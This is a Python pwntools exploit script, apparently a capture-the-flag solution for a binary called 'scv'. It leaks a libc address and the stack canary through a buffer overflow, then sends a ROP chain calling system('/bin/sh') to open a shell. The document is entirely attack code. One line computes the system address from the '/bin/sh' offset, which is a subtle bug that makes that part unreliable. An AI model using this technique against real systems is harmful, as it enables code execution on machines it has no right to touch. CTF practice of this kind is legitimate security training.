#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
local = 1
if local:
	p = process('./scv', env={'LD_PRELOAD':'./libc-2.23.so'})
else:
	p = remote('127.0.0.1', 8888)
libc = ELF('./libc-2.23.so')
elf = ELF('./scv')
# gdb.attach(p)
system_offset = libc.symbols['system']
str_bin_sh_offset = next(libc.search('/bin/sh'))
log.success('system_offset = ' + hex(system_offset))
log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))
pop_rdi_ret = 0x0000000000400ea3
log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))
one_gadget_offset = 0x45216
log.success('one_gadget_offset = ' + hex(one_gadget_offset))
libc_base_offset = 0x3a20a
log.success('libc_base_offset = ' + hex(libc_base_offset))

def edit(content):
	p.sendlineafter('>>', '1')
	p.recvuntil('>>')
	p.send(content)

def show():
	p.sendlineafter('>>', '2')

def quit():
	p.sendlineafter('>>', '3')

edit('A' * (40 - 1) + ':')
show()
p.recvuntil(':')
leak_addr = u64(p.recv(6).ljust(8, '\x00'))
log.success('leak_addr = ' + hex(leak_addr))
libc_base = leak_addr - libc_base_offset
log.success('libc_base = ' + hex(libc_base))
system = libc_base + str_bin_sh_offset
str_bin_sh = libc_base + str_bin_sh_offset
log.success('system = ' + hex(system))
log.success('str_bin_sh = ' + hex(str_bin_sh))
edit('A' * 168 + ':')
show()
p.recvuntil(':')
canary = u64('\x00' + p.recv(7))
log.success('canary = ' + hex(canary))
payload = flat([
	'A' * 168, 
	canary, 
	'B' * 8, 
	pop_rdi_ret, 
	str_bin_sh, 
	system
])
edit(payload)
quit()
p.interactive()
